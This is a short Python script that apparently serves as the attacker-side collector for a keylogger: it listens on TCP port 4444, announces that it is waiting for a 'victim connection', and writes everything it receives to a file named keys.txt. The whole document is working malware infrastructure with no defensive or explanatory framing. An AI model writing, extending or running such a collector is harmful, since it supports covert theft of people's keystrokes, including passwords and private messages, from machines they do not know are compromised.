
import socket

HOST = "0.0.0.0"
PORT = 4444

log_file = "keys.txt"

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(1)

print("[+] Listening for victim connection...")

conn, addr = server.accept()
print(f"[+] Connection from {addr}")

with open(log_file, "a") as f:
	while True:
		data = conn.recv(1024)
	
		if not data:
			break

		text = data.decode()

		print(text, end="", flush=True)
		f.write(text)
		f.flush()

conn.close()
